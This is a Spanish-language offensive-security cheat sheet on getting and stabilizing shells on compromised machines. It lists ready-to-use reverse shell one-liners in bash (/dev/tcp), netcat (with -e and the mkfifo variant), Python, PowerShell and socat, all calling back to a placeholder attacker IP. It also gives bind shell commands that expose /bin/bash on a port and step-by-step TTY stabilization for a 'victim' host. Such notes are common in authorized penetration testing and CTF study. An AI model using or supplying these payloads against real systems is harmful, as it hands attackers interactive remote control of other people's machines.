# Shells y Estabilización de TTY

Conseguir ejecución de comandos es media batalla; la otra media es tener una **shell cómoda y estable**. Esta nota reúne los tipos de shell, los payloads de reverse shell para cualquier situación y cómo estabilizar una TTY para trabajar como si estuvieras en SSH.

---

## Tipos de shell

```flow
Reverse shell :: La VÍCTIMA se conecta a TI. La más usada: atraviesa firewalls de salida.
Bind shell :: La víctima ABRE un puerto y TÚ te conectas. Útil si no puedes recibir conexiones.
Web shell :: Un script (.php/.aspx) en el servidor web que ejecuta comandos vía HTTP.
```

---

## Reverse shell (lo habitual)

Primero ponte a la escucha en tu máquina:

```bash
nc -lvnp 443
```

Y en la víctima, según lo que tenga instalado:

```bash
# Bash (el más común)
bash -c 'bash -i >& /dev/tcp/<TU_IP>/443 0>&1'

# sh / genérico
sh -i >& /dev/tcp/<TU_IP>/443 0>&1

# Netcat (con -e)
nc <TU_IP> 443 -e /bin/bash

# Netcat sin -e (OpenBSD)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <TU_IP> 443 >/tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<TU_IP>",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PowerShell (Windows)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<TU_IP>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=([text.encoding]::ASCII).GetBytes($r);$s.Write($s2,0,$s2.Length)}"
```

> **Consejo:** usa puertos que el firewall de salida suele permitir: **443**, 80, 53. Para no memorizar payloads, la web **revshells.com** los genera en cualquier lenguaje poniendo tu IP y puerto; es la referencia estándar.

---

## Bind shell

Cuando no puedes recibir conexiones (estás detrás de NAT y la víctima no puede salir):

```bash
# En la víctima (abre un puerto)
nc -lvnp 4444 -e /bin/bash

# En tu máquina (te conectas a ella)
nc <IP_VICTIMA> 4444
```

---

## Estabilizar la shell (TTY) — Linux

Una reverse shell "cruda" no tiene autocompletado, ni flechas, ni `Ctrl+C` seguro (lo mata todo). Estabilízala siempre:

**Paso 1 — en la shell de la víctima**, genera una PTY:

```bash
script /dev/null -c bash
# alternativas si no hay 'script':
python3 -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
```

**Paso 2 — deja la shell en segundo plano** con `Ctrl+Z`.

**Paso 3 — en TU terminal**, ajusta el modo y recupérala:

```bash
stty raw -echo; fg
# pulsa Enter un par de veces
```

**Paso 4 — de nuevo en la shell de la víctima**, exporta el entorno:

```bash
export TERM=xterm
export SHELL=bash
# ajusta el tamaño (mira filas/columnas con 'stty size' en TU terminal)
stty rows 38 cols 116
```

Ahora tienes flechas, historial, `Ctrl+C` seguro, `clear` y autocompletado.

> **Nota:** si `Ctrl+C` mata tu shell, es que no la estabilizaste; repite el paso 3. Y si al salir tu terminal queda "roto" (sin eco), ejecuta `reset` o `stty sane`.

---

## Mejorar shells en Windows

Las shells de Windows no tienen "TTY" como Linux, pero puedes subir de nivel:

- Pasar de CMD a **PowerShell**: simplemente ejecuta `powershell`.
- Conseguir una shell más robusta con **evil-winrm** (si hay credenciales) o un **Meterpreter**.
- `ConPtyShell` da una pseudo-TTY completa en Windows moderno.

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `nc` / `ncat` / `socat` | Listeners y shells (socat permite TTY completas). |
| `revshells.com` | Generador de payloads de reverse shell. |
| `pwncat-cs` | Listener avanzado que estabiliza la shell automáticamente. |
| `ConPtyShell` | Pseudo-TTY completa en Windows. |

---

## socat: shell totalmente interactiva (bonus)

Si tienes `socat` en ambos extremos, consigues una TTY perfecta de una vez:

```bash
# En tu máquina
socat file:`tty`,raw,echo=0 tcp-listen:443

# En la víctima
socat tcp:<TU_IP>:443 exec:'bash -li',pty,stderr,setsid,sigint,sane
```

---

> **Consejo:** el reflejo tras cualquier RCE debe ser: **reverse shell → estabilizar TTY → enumerar para escalar**. Dedica 20 segundos a estabilizar siempre; trabajar en una shell sin TTY es lento, frágil y te hará perder el acceso con un `Ctrl+C` descuidado. Herramientas como `pwncat-cs` hacen la estabilización por ti.
